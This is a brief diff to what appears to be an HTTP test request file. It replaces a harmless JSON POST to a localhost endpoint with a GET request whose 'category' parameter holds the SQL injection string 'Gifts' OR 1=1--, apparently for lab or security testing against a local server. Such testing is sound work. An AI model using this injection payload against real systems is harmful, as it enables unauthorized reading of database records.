@@ -1,6 +1,1 @@
-POST http://localhost:5000/postable
-Content-Type: application/json; charset=utf-8
-
-{
-    "data": "works"
-}
+GET http://localhost:5000/proxy?category=Gifts'+OR+1=1--
